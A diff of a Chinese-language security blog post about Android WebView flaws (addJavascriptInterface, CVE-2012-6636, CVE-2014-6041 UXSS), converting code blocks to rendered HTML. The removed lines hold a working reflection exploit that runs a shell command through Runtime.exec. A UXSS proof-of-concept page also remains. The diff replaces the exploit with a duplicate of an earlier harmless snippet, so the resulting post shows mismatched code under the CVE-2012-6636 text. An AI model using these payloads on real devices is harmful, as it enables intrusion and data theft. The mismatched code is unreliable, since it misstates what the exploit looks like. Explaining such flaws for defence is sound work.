@@ -23,41 +23,35 @@ READMORE
 ##### 風險：木馬跳板，個資被盜
 目前有機會發生 RCE 風險都圍繞在 [addJavascriptInterface][] 這個功能上，該功能原意是為被載入的網頁和原生程式間建立一個"橋樑"，通過預先設定好的介面，讓網頁能呼叫指定的公開函式並取得函式回傳的結果。
 
-{% highlight java %}
-class JsObject {
-    public String toString() { return "Hello World"; }
-}
+<div class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">class</span> <span class="nc">JsObject</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span> <span class="k">return</span> <span class="s">"Hello World"</span><span class="o">;</span> <span class="o">}</span>
+<span class="o">}</span>
 
-webView.getSettings().setJavaScriptEnabled(true);
-webView.addJavascriptInterface(new JsObject(), "injectedObject");
-webView.loadUrl("http://www.example.com/");
-{% endhighlight %}
+<span class="n">webView</span><span class="o">.</span><span class="na">getSettings</span><span class="o">().</span><span class="na">setJavaScriptEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+<span class="n">webView</span><span class="o">.</span><span class="na">addJavascriptInterface</span><span class="o">(</span><span class="k">new</span> <span class="nf">JsObject</span><span class="o">(),</span> <span class="s">"injectedObject"</span><span class="o">);</span>
+<span class="n">webView</span><span class="o">.</span><span class="na">loadUrl</span><span class="o">(</span><span class="s">"http://www.example.com/"</span><span class="o">);</span></code></pre></div>
 
-{% highlight html %}
-<html>
-    <head>…
-    <script>
-       alert(injectedObject.toString()); // return "Hello World"
-    </script>
-    </head>
-    <body>…</body>
-</html>
-{% endhighlight %}
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>…
+    <span class="nt">&lt;script&gt;</span>
+       <span class="nx">alert</span><span class="p">(</span><span class="nx">injectedObject</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span> <span class="c1">// return "Hello World"</span>
+    <span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>…<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
 
 像上面的例子裡，網頁能通過預先設定好的 "injectedObject" 介面，呼叫 "toString" 函式，得到 "Hello World" 這個字串。
 
 其漏洞 [CVE-2012-6636](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636) 最早在2012年12月被[公佈](http://50.56.33.56/blog/?p=314)出來，攻擊者有機會利用他通過 Java Reflection API 來執行任意代碼。影響 Android 1.X ~ 4.1。
 
-{% highlight html %}
-<script>
-    function execute(cmdArgs) {
-        return injectedObject.getClass().forName("java.lang.Runtime")
-                              .getMethod("getRuntime",null)
-                              .invoke(null,null).exec(cmdArgs);
-    }
-    execute(["/system/bin/sh","-c","cat vuln >> attacker.txt"]);
-</script>
-{% endhighlight %}
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>…
+    <span class="nt">&lt;script&gt;</span>
+       <span class="nx">alert</span><span class="p">(</span><span class="nx">injectedObject</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span> <span class="c1">// return "Hello World"</span>
+    <span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>…<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
 
 其後 Google 在 Android 4.2 開始對 [addJavascriptInterface][] 的使用方式加了限制，使用時需要在 Java 端把可被網頁執行的公開函式透過 @JavascriptInterface 來標註。並奉勸開發者別在 4.1 或之前的系統上使用 [addJavascriptInterface][]。
 
@@ -95,19 +89,17 @@ webView.loadUrl("http://www.example.com/");
 
 其中 [CVE-2014-6041](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041) 漏洞，通過程式在處理 \u0000 (unicode null byte) 時的失誤而繞過了原有的限制。
 
-{% highlight html %}
-<html>
-    <head>
-        <title>CVE-2014-6041 UXSS DEMO</title>
-    </head>
-    <body>
-        <iframe name="target_frame" src="http://devco.re/"></iframe>
-        <br />
-        <input type="button" value="go" onclick="window.open('\u0000javascript:alert(document.domain)',
-'target_frame')" />
-    </body>
-</html>
-{% endhighlight %}
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;title&gt;</span>CVE-2014-6041 UXSS DEMO<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>
+    <span class="nt">&lt;body&gt;</span>
+        <span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"target_frame"</span> <span class="na">src=</span><span class="s">"http://devco.re/"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+        <span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">value=</span><span class="s">"go"</span> <span class="na">onclick=</span><span class="s">"window.open('\u0000javascript:alert(document.domain)',</span>
+<span class="s">'target_frame')"</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
 
 如果上面的網頁是放置在與 <http://devco.re/> 不同源的地方，正常來說點擊按鈕後會因為 SOP 的關係，該段 JavaScript 無法執行而不會有反應。但在受影響的環境裡則能順利執行並跳出 "devco.re" 這個網域名稱。
 
@@ -131,7 +123,6 @@ webView.loadUrl("http://www.example.com/");
 
 下面我們製作了一段結合中間人攻擊與 addJavascriptInterface 漏洞，模擬使用者手機被入侵的影片：
 
-{% youtube reKEu-Ajo50 %}
 
 從影片的最後可以看到，攻擊者取得存在漏洞的應用程式權限，並取得裡面的機敏資料。
 
